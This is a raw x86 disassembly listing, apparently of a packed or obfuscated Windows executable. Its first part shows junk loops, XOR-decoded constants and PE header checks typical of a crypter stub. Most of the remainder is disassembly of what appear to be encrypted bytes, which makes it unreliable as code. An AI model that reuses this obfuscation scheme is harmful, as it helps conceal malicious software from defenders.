  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab5:	retf   0x5740
  402ab8:	jl     0x402b36
  402aba:	jl     0x402b38
  402abc:	xor    al,0x5f
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	jno    0x402b49
  402ace:	ins    BYTE PTR es:[edi],dx
  402acf:	ins    BYTE PTR es:[edi],dx
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi-0x5fedbb0e]
  402b65:	loop   0x402bc9
  402b67:	ja     0x402b53
  402b69:	cmp    ecx,DWORD PTR ds:0xdcb49e3d
  402b6f:	or     ebx,DWORD PTR [edi+0x536905bd]
  402b75:	int    0x2c
  402b77:	pop    esi
  402b78:	xor    ecx,ebx
  402b7a:	clc    
  402b7b:	mov    ebp,DWORD PTR [edi]
  402b7d:	sub    DWORD PTR [ebx],0xeef6210b
  402b83:	repz mov eax,ds:0x81068613
  402b89:	popf   
  402b8a:	sbb    BYTE PTR [esi-0x26],al
  402b8d:	sub    DWORD PTR [ebp-0x6cdbab6c],edx
  402b93:	jle    0x402ba1
  402b95:	xor    esp,DWORD PTR [ebx+0x228eed73]
  402b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b9c:	mov    ebx,0x2837c80f
  402ba1:	pop    edx
  402ba2:	pop    ebx
  402ba3:	mov    al,ds:0x4be8a27c
  402ba8:	adc    eax,0xb8f5c163
  402bad:	cmp    eax,0x26a1ed3d
  402bb2:	test   BYTE PTR [eax],dl
  402bb4:	cld    
  402bb5:	mov    cs,WORD PTR [ecx-0x5d0c4dd8]
  402bbb:	adc    al,0x92
  402bbd:	outs   dx,BYTE PTR ds:[esi]
  402bbe:	rcl    DWORD PTR [edi-0x38],1
  402bc1:	call   0xcf47:0x10713586
  402bc8:	jge    0x402b98
  402bca:	imul   edi,DWORD PTR [esi-0x6a1f1412],0xfffffff4
  402bd1:	mov    al,0x44
  402bd3:	add    al,0x23
  402bd5:	(bad)  
  402bd6:	ds ins BYTE PTR es:[edi],dx
  402bd8:	jns    0x402c15
  402bda:	not    ebp
  402bdc:	mov    DWORD PTR [ecx-0xc7df4a5],esi
  402be2:	in     eax,dx
  402be3:	pushf  
  402be4:	xchg   esp,eax
  402be5:	loope  0x402b7e
  402be7:	inc    esi
  402be8:	and    al,0xf7
  402bea:	fiadd  DWORD PTR [esi-0xd]
  402bed:	push   esi
  402bef:	sbb    al,0x80
  402bf1:	cmp    al,0xbb
  402bf3:	(bad)  
  402bf4:	push   DWORD PTR ds:0x89099d63
  402bfa:	loopne 0x402c26
  402bfc:	rol    edi,0x94
  402bff:	and    edx,DWORD PTR [esi-0x2708ca05]
  402c05:	scas   eax,DWORD PTR es:[edi]
  402c06:	push   0xffffffe6
  402c08:	jo     0x402b8d
  402c0a:	cmc    
  402c0b:	mov    ecx,0x95553357
  402c10:	jmp    0x6026:0xe2eeb734
  402c17:	(bad)  
  402c18:	or     eax,DWORD PTR [eax+0x51]
  402c1b:	leave  
  402c1c:	retf   0x6baa
  402c1f:	popa   
  402c20:	adc    BYTE PTR [edx-0x16b205ab],0xed
  402c27:	and    DWORD PTR [eax+ebx*4+0x39],eax
  402c2b:	je     0x402bf8
  402c2d:	pop    eax
  402c2e:	repz popf 
  402c30:	dec    edx
  402c31:	icebp  
  402c32:	sub    DWORD PTR [eax-0x6e063be6],edx
  402c38:	push   ds
  402c39:	ret    
  402c3a:	aas    
  402c3b:	pop    ebx
  402c3c:	inc    ebx
  402c3d:	mov    ch,0x97
  402c3f:	xchg   esi,eax
  402c40:	pop    eax
  402c41:	fdiv   st,st(3)
  402c43:	aad    0xc8
  402c45:	pop    ecx
  402c46:	shl    BYTE PTR ds:0xc84a233a,1
  402c4c:	xor    ecx,edx
  402c4e:	or     al,0x90
  402c50:	jge    0x402be1
  402c52:	jne    0x402c22
  402c54:	mov    ch,0xd9
  402c56:	sbb    ch,0x24
  402c59:	cmp    esi,DWORD PTR [edi-0x1c]
  402c5c:	pop    ss
  402c5d:	ins    BYTE PTR es:[edi],dx
  402c5e:	mov    edx,0x61429d62
  402c63:	in     eax,dx
  402c64:	(bad)  
  402c65:	xchg   ebx,eax
  402c66:	sub    bh,bl
  402c68:	ret    
  402c69:	xchg   edx,eax
  402c6a:	jmp    FWORD PTR [edi+0x4d]
  402c6d:	jb     0x402c27
  402c6f:	inc    ecx
  402c70:	pushf  
  402c71:	sbb    al,0x3
  402c73:	jecxz  0x402cf3
  402c75:	pop    esi
  402c76:	imul   ebp,DWORD PTR [eax],0x21e2bbc9
  402c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c7d:	inc    ebx
  402c7e:	call   0xfa2d684c
  402c83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c84:	in     eax,0xc4
  402c86:	jbe    0x402cb5
  402c88:	dec    esp
  402c89:	aas    
  402c8a:	(bad)  
  402c8b:	jmp    0x9305:0x6830cd47
  402c92:	add    eax,0xab43a33b
  402c97:	jno    0x402cd6
  402c99:	frstor [eax+0x62]
  402c9c:	add    al,BYTE PTR [esi+eiz*8]
  402c9f:	fstp   st(6)
  402ca1:	xor    al,0x22
  402ca3:	dec    ebx
  402ca4:	pop    edx
  402ca5:	push   ds
  402ca6:	out    dx,al
  402ca7:	push   0x1f1cc040
  402cac:	out    0x78,al
  402cae:	mov    dl,0x57
  402cb0:	xchg   esi,eax
  402cb1:	or     dh,ch
  402cb3:	sahf   
  402cb4:	add    ebx,edx
  402cb6:	repz test DWORD PTR [esi],edi
  402cb9:	dec    esi
  402cba:	push   ebp
  402cbb:	add    DWORD PTR [esi],esp
  402cbd:	rsqrtps xmm1,XMMWORD PTR ds:0xae1ce6b9
  402cc4:	(bad)  
  402cc6:	push   ss
  402cc7:	jmp    0xbd29be56
  402ccc:	or     cl,0xa6
  402ccf:	scas   al,BYTE PTR es:[edi]
  402cd0:	pusha  
  402cd1:	imul   esi,DWORD PTR [ebx+0x1cd2b929],0x54
  402cd8:	fcomp  QWORD PTR [eax+0x5]
  402cdb:	xchg   esp,eax
  402cdc:	pop    es
  402cdd:	lock not DWORD PTR [ebx+0x32f95b71]
  402ce4:	aas    
  402ce5:	stos   DWORD PTR es:[edi],eax
  402ce6:	mov    ch,0xc9
  402ce8:	push   es
  402ce9:	cli    
  402cea:	push   ss
  402ceb:	xchg   edi,eax
  402cec:	cwde   
  402ced:	inc    esp
  402cee:	xor    BYTE PTR [edi-0x1c],ah
  402cf1:	xchg   ebx,eax
  402cf2:	cwde   
  402cf3:	cmp    dl,BYTE PTR [eax-0x28]
  402cf6:	adc    eax,0x3f885c39
  402cfb:	ja     0x402d6f
  402cfd:	add    edx,DWORD PTR [edx-0xa499ea]
  402d03:	aam    0x37
  402d05:	mov    BYTE PTR ds:0xa496bbd5,ch
  402d0b:	cwde   
  402d0c:	or     BYTE PTR [eax+0x17a6986a],cl
  402d12:	lock jmp 0x426df84
  402d18:	jge    0x402d48
  402d1a:	je     0x402d12
  402d1c:	js     0x402ce6
  402d1e:	mov    bh,0x37
  402d20:	cs mov dl,0xd4
  402d23:	sahf   
  402d24:	je     0x402cce
  402d26:	test   DWORD PTR ds:0x64cffae,0xd785eaa4
  402d30:	mov    esi,0x730fe14a
  402d35:	or     BYTE PTR [ebp-0x1b],dh
  402d38:	jne    0x402d30
  402d3a:	push   eax
  402d3b:	mov    esp,0x4206d67f
  402d40:	jle    0x402cf0
  402d42:	enter  0x8eb1,0xd2
  402d46:	mov    ah,0x17
  402d48:	lea    ebx,[eax]
  402d4a:	jge    0x402d82
  402d4c:	mov    ch,0x89
  402d4e:	stc    
  402d4f:	not    DWORD PTR [edx+0xb2dfc7e]
  402d55:	mov    ebx,0xcf17b02f
  402d5a:	jno    0x402d29
  402d5c:	imul   ebx,DWORD PTR [ebx],0x11dac727
  402d62:	into   
  402d63:	(bad)  
  402d64:	mov    edi,0xde5615a4
  402d69:	sub    bl,BYTE PTR [di+0x10]
  402d6d:	mov    dh,0x4d
  402d6f:	mov    eax,ds:0x25be4a8
  402d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d75:	nop
  402d76:	adc    ecx,DWORD PTR [ecx+0x391018d8]
  402d7c:	(bad)  
  402d7e:	imul   ecx,DWORD PTR [ebx-0x7aaf2c54],0xfffffff8
  402d85:	pop    DWORD PTR [eax-0x7d7de1ca]
  402d8b:	(bad)  
  402d8d:	adc    BYTE PTR [edx+0x36e33806],dh
  402d93:	(bad)  
  402d94:	mov    esi,0xf3267cf4
  402d99:	(bad)  
  402d9a:	mov    dl,0x5
  402d9c:	imul   eax,ecx,0xffffffb5
  402d9f:	pop    ebx
  402da0:	xor    esi,DWORD PTR [ebx]
  402da2:	pop    es
  402da3:	xor    edx,edx
  402da5:	fistp  DWORD PTR [ebx-0x71f30dc8]
  402dab:	mov    al,0xdc
  402dad:	cld    
  402dae:	add    BYTE PTR [ecx-0x2e975bfa],ch
  402db4:	cmp    DWORD PTR [esi-0x353edd6b],esp
  402dba:	clc    
  402dbb:	aad    0xce
  402dbd:	mov    cl,0xa7
  402dbf:	int3   
  402dc0:	inc    eax
  402dc1:	inc    ecx
  402dc2:	int3   
  402dc3:	ds pop ds
  402dc5:	xor    bl,cl
  402dc7:	repnz (bad) 
  402dc9:	fmul   st(7),st
  402dcb:	mov    ebp,DWORD PTR [ebx+0x34d6fc4c]
  402dd1:	jmp    FWORD PTR [ebx-0x3a]
  402dd4:	inc    esp
  402dd5:	inc    esi
  402dd6:	icebp  
  402dd7:	(bad)  
  402dd8:	je     0x402da9
  402dda:	call   FWORD PTR ds:0x8983836f
  402de0:	mov    al,0x4c
  402de2:	or     eax,0x536f41c5
  402de7:	adc    esi,DWORD PTR [ebp-0x74]
  402dea:	shr    DWORD PTR [ecx-0x44635091],1
  402df0:	add    al,0xc6
  402df2:	arpl   WORD PTR [esi+0x72],ax
  402df5:	add    bl,dh
  402df7:	stos   BYTE PTR es:[edi],al
  402df8:	xor    al,0xd3
  402dfa:	shr    ecx,0xf5
  402dfd:	out    dx,al
  402dfe:	les    ecx,FWORD PTR [ebx+0x5b]
  402e01:	sbb    edi,DWORD PTR [ecx+0x1d]
  402e04:	lods   al,BYTE PTR ds:[esi]
  402e05:	ja     0x402e09
  402e07:	jmp    0x402dff
  402e09:	(bad)  
  402e0a:	stos   DWORD PTR es:[edi],eax
  402e0b:	sub    DWORD PTR [eax-0x77],edi
  402e0e:	repz pop ss
  402e10:	fdivr  DWORD PTR [edi]
  402e12:	or     eax,0x53534c29
  402e17:	mov    esp,0xb6512e63
  402e1c:	xchg   DWORD PTR [esi+eiz*4],ecx
  402e1f:	mov    al,ds:0x66fc3030
  402e24:	lods   al,BYTE PTR ds:[esi]
  402e25:	(bad)  
  402e26:	push   0x30a644c
  402e2b:	or     al,0xc8
  402e2d:	xor    ebx,DWORD PTR [esi+0x40ffec0c]
  402e33:	pop    esi
  402e34:	rcl    DWORD PTR [edx-0x12],1
  402e37:	dec    edx
  402e38:	xor    al,0x1c
  402e3a:	mov    al,BYTE PTR [edi-0x64cc9f6e]
  402e40:	test   eax,esi
  402e42:	inc    esp
  402e43:	repnz aas 
  402e45:	addr16 imul ebp,ecx,0x69
  402e49:	fisubr WORD PTR [eax+0x2]
  402e4c:	or     BYTE PTR [esi+0x6d],ch
  402e4f:	pcmpeqd mm5,QWORD PTR [edi]
  402e52:	xchg   esp,eax
  402e53:	dec    esp
  402e54:	sub    DWORD PTR [eax],eax
  402e56:	test   dh,dl
  402e58:	sub    al,0x89
  402e5a:	add    dl,BYTE PTR [ecx+0x3]
  402e5d:	inc    edx
  402e5e:	add    BYTE PTR [ebx],cl
  402e60:	stos   DWORD PTR es:[edi],eax
  402e61:	add    BYTE PTR [ebx-0x34f23fe],cl
  402e67:	call   0x1fba:0x79bf0b5b
  402e6e:	xor    edx,DWORD PTR [ecx-0x7f06c7d3]
  402e74:	outs   dx,BYTE PTR ds:[esi]
  402e75:	sbb    edx,edi
  402e77:	daa    
  402e78:	jp     0x402e87
  402e7a:	js     0x402e56
  402e7c:	mov    dh,0x2d
  402e7e:	ror    DWORD PTR [ecx],1
  402e80:	and    al,0x11
  402e82:	in     al,dx
  402e83:	xor    ebp,DWORD PTR [esi-0x1f978152]
  402e89:	in     eax,0x8d
  402e8b:	xchg   esi,eax
  402e8c:	not    DWORD PTR [ebx-0x26a3529f]
  402e92:	pop    esi
  402e93:	adc    BYTE PTR [edx+eiz*4+0x54e276f9],al
  402e9a:	lods   al,BYTE PTR ds:[esi]
  402e9b:	aad    0x86
  402e9d:	xchg   ebx,eax
  402e9e:	iret   
  402e9f:	ret    0xcc37
  402ea2:	xchg   edx,eax
  402ea3:	fwait
  402ea4:	jge    0x402e80
  402ea6:	xchg   ebx,eax
  402ea7:	add    dh,BYTE PTR [eax]
  402ea9:	adc    dl,0xa4
  402eac:	js     0x402ef8
  402eae:	push   esi
  402eaf:	stc    
  402eb0:	add    eax,DWORD PTR [esi]
  402eb2:	push   edi
  402eb3:	xchg   esi,eax
  402eb4:	jno    0x402e53
  402eb6:	sahf   
  402eb7:	test   BYTE PTR [eiz*1-0x37b3a0ec],dh
  402ebe:	push   ebp
  402ebf:	jbe    0x402f36
  402ec1:	and    al,0x68
  402ec3:	clc    
  402ec4:	test   eax,0x9d34df54
  402ec9:	sbb    BYTE PTR [eax],bl
  402ecb:	test   eax,0x4ce4f30e
  402ed0:	out    dx,al
  402ed1:	mov    ebp,0x95e1d979
  402ed6:	ror    DWORD PTR ds:0x6594660f,0x29
  402edd:	shr    BYTE PTR [edx-0x70],0x1e
  402ee1:	arpl   bp,ax
  402ee3:	push   ds
  402ee4:	jmp    0xde39:0x9207cdac
  402eeb:	cmp    ecx,ebp
  402eed:	push   cs
  402eee:	cld    
  402eef:	aaa    
  402ef0:	fld    QWORD PTR [ebp+ebp*1-0x2dea2021]
  402ef7:	dec    edx
  402ef8:	sti    
  402ef9:	xchg   esi,eax
  402efa:	dec    edi
  402efb:	leave  
  402efc:	push   0xe6ea3b1c
  402f01:	ret    
  402f02:	repnz aad 0x94
  402f05:	lock mov al,0xd0
  402f08:	add    al,0x2a
  402f0a:	out    0x1e,eax
  402f0c:	cmp    bh,bh
  402f0e:	test   al,0xf8
  402f10:	push   edx
  402f11:	cdq    
  402f12:	lds    esi,FWORD PTR [ebx-0x31d615a7]
  402f18:	inc    eax
  402f19:	scas   eax,DWORD PTR es:[edi]
  402f1a:	loop   0x402eb8
  402f1c:	out    0xe2,eax
  402f1e:	mov    ebx,0x7ed2fa99
  402f23:	popa   
  402f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f25:	inc    eax
  402f26:	div    eax
  402f28:	dec    ecx
  402f29:	retf   
  402f2a:	(bad)  
  402f2b:	mov    ebx,0x34720cd9
  402f30:	cs jb  0x402f3b
  402f33:	mov    ds:0x2fe45bb0,eax
  402f38:	fidiv  WORD PTR ds:0x5c6241c7
  402f3e:	mov    DWORD PTR [eax],0x2708ac40
  402f44:	xor    BYTE PTR [ecx-0x2925157],bl
  402f4a:	mov    DWORD PTR [esi+ebx*2],ebx
  402f4d:	mov    ah,0x85
  402f4f:	mov    bl,BYTE PTR [ebx+0x3da2a31]
  402f55:	mov    ebp,0x9d4c223a
  402f5a:	(bad)
  402f5e:	fisttp QWORD PTR [ebx-0x5d30f55d]
  402f64:	dec    ebx
  402f65:	das    
  402f66:	sbb    BYTE PTR [eax+eiz*4-0x14c1974b],dl
  402f6d:	loope  0x402f07
  402f6f:	ja     0x402f97
  402f71:	or     BYTE PTR [edi],al
  402f73:	and    ch,BYTE PTR [edi]
  402f75:	xor    DWORD PTR [ebp-0x45],esi
  402f78:	pop    edi
  402f79:	and    al,0xae
  402f7b:	mov    al,ds:0xefcfb07d
  402f80:	xchg   edx,eax
  402f81:	jae    0x402f6c
  402f83:	pop    es
  402f84:	(bad)  
  402f85:	xchg   ebx,eax
  402f86:	das    
  402f87:	sbb    DWORD PTR [ebx],ebp
  402f89:	into   
  402f8a:	xchg   edx,eax
  402f8b:	fsubr  DWORD PTR [eax-0x52]
  402f8e:	sbb    DWORD PTR [esi],edx
  402f90:	test   eax,0x3597b909
  402f95:	fnstcw WORD PTR [edi+0x298765d5]
  402f9b:	(bad)  
  402f9d:	repnz cwde 
  402f9f:	fistp  QWORD PTR [esi+0x7a]
  402fa2:	icebp  
  402fa3:	or     BYTE PTR [eax],bh
  402fa5:	fisub  WORD PTR [ebp+0x63]
  402fa8:	nop
  402fa9:	ds jno 0x402fa7
  402fac:	add    eax,0xddd3fa1f
  402fb1:	xchg   ecx,eax
  402fb2:	dec    DWORD PTR [ebx-0x7d90af06]
  402fb8:	add    al,0x4f
  402fba:	pop    esp
  402fbb:	jae    0x402f85
  402fbd:	add    eax,0x3ec0d329
  402fc2:	and    dl,BYTE PTR [ecx-0x14e6f8c]
  402fc8:	aad    0x3f
  402fca:	add    esp,edx
  402fcc:	fistp  WORD PTR [eax]
  402fce:	mov    dl,0x47
  402fd0:	daa    
  402fd1:	dec    esp
  402fd2:	mov    bl,0x64
  402fd4:	por    mm0,QWORD PTR [ebp-0x3a]
  402fd8:	xor    BYTE PTR ds:0x64fbd715,dl
  402fde:	(bad)  
  402fdf:	mov    ecx,0x2cb4b617
  402fe4:	hlt    
  402fe5:	jmp    0x135f57dc
  402fea:	mov    esi,0x39685d6b
  402fef:	lahf   
  402ff0:	sti    
  402ff1:	fstp   QWORD PTR [esi+0x7ff402a4]
  402ff7:	mov    ds:0x10a75b5d,al
  402ffc:	mov    eax,0x1b04f1c
  403001:	pop    ecx
  403002:	data16 and dh,0x2
  403006:	clc    
  403007:	xchg   ebp,eax
  403008:	jg     0x40302e
  40300a:	jae    0x402fb8
  40300c:	pop    ecx
  40300d:	les    edi,FWORD PTR [ebp+0x50317b1e]
  403013:	add    eax,0x3d0f7da8
  403018:	repz leave 
  40301a:	aas    
  40301b:	cld    
  40301c:	out    dx,al
  40301d:	add    BYTE PTR [ebp+esi*4-0x1c11e37],dl
  403024:	and    esi,DWORD PTR [ecx+0x4514d219]
  40302a:	call   0x1a7b:0x10f0eae5
  403031:	cmp    DWORD PTR [ecx],ebx
  403033:	mov    al,ds:0xd5151b1f
  403038:	sbb    ecx,edx
  40303a:	jg     0x4030ad
  40303c:	jb     0x40301d
  40303e:	cmp    cl,cl
  403040:	xor    BYTE PTR [eax-0x52],al
  403043:	add    DWORD PTR [edx-0xd],esi
  403046:	sar    al,cl
  403048:	clc    
  403049:	cmp    eax,0x9f0d0037
  40304e:	std    
  40304f:	mov    edi,0x2ab09d69
  403054:	loop   0x4030ab
  403056:	js     0x40304c
  403058:	hlt    
  403059:	xchg   BYTE PTR [esi-0x63],ch
  40305c:	(bad)  
  40305d:	out    dx,eax
  40305e:	inc    edx
  40305f:	sahf   
  403060:	mov    eax,ds:0x15f94ec0
  403065:	(bad)  
  403066:	popf   
  403067:	fldenv [ebx+0xce9d614]
  40306d:	rol    al,cl
  40306f:	sahf   
  403070:	aam    0x8b
  403072:	add    BYTE PTR [esi-0x546e090a],0xa2
  403079:	sub    BYTE PTR [ecx-0x74],0x95
  40307d:	adc    al,0x45
  40307f:	adc    BYTE PTR [ecx],dl
  403081:	cmp    BYTE PTR [edx+ecx*4],0x5b
  403085:	cmp    eax,0x42a7b567
  40308a:	(bad)  
  40308b:	sub    esp,DWORD PTR [ecx-0x14]
  40308e:	mov    edx,0x609aa9aa
  403093:	or     eax,0xd839323e
  403098:	adc    dh,BYTE PTR [eax+0x1f84b5ce]
  40309e:	lock cmp al,0xec
  4030a1:	into   
  4030a2:	test   DWORD PTR [eax-0xe82f2a0],esp
  4030a8:	add    eax,DWORD PTR [esi]
  4030aa:	pop    edx
  4030ab:	and    BYTE PTR [edi],ch
  4030ad:	mov    ecx,0xd41ebe52
  4030b3:	mov    dh,0x20
  4030b5:	dec    ecx
  4030b6:	bound  edi,QWORD PTR [ebp+0x4f]
  4030b9:	test   ch,0xf7
  4030bc:	jmp    0xa5dbbe57
  4030c1:	call   0x3a3d8c2
  4030c6:	or     eax,0x3a134fb6
  4030cb:	sub    ch,BYTE PTR [ebx+0x74eecde0]
  4030d1:	mov    al,0x42
  4030d3:	xor    dl,ah
  4030d5:	pop    eax
  4030d6:	cmp    al,0x40
  4030d8:	xchg   ebx,eax
  4030d9:	xchg   ecx,eax
  4030da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030db:	or     ecx,DWORD PTR [edi-0x751969fe]
  4030e1:	inc    ecx
  4030e2:	xchg   ebp,eax
  4030e3:	mov    eax,ds:0xd73fb609
  4030e8:	jmp    0x984a:0x85bfdcf8
  4030ef:	icebp  
  4030f0:	(bad)  [esi]
  4030f2:	in     al,dx
  4030f3:	mov    ah,0x66
  4030f5:	inc    eax
  4030f6:	dec    ebp
  4030f7:	js     0x4030af
  4030f9:	stc    
  4030fa:	mov    ah,0x69
  4030fc:	or     dl,BYTE PTR ds:0x474581d0
  403102:	out    dx,eax
  403103:	mov    bh,0xd1
  403105:	jne    0x403103
  403107:	push   es
  403108:	or     al,0xfa
  40310a:	jl     0x4030bb
  40310c:	scas   al,BYTE PTR es:[edi]
  40310d:	imul   esi,ebp,0xffffffcb
  403110:	xchg   ebx,eax
  403111:	and    eax,0xa26b44bd
  403116:	je     0x40312a
  403118:	aaa    
  403119:	sub    al,BYTE PTR [esi+0x2b5ca70e]
  40311f:	das    
  403120:	sub    al,0x42
  403122:	lock mov dl,0x3
  403125:	inc    eax
  403126:	lods   eax,DWORD PTR ds:[esi]
  403127:	xchg   esp,eax
  403128:	pop    ebp
  403129:	jno    0x40315b
  40312b:	jmp    0x34bb:0x1be74722
  403132:	mov    ch,0xed
  403134:	push   ecx
  403135:	pop    esp
  403136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403137:	sbb    eax,0x299b4815
  40313c:	jp     0x4031a9
  40313e:	add    BYTE PTR gs:[esi],cl
  403141:	mov    DWORD PTR [ecx-0x50ed7450],eax
  403147:	xchg   edx,eax
  403148:	jle    0x4030e4
  40314a:	pop    esi
  40314b:	pop    ecx
  40314c:	dec    esi
  40314d:	outs   dx,BYTE PTR ds:[esi]
  40314e:	dec    edx
  40314f:	lock pop esp
  403151:	add    eax,0x9c0ff617
  403156:	dec    eax
  403157:	xchg   esi,eax
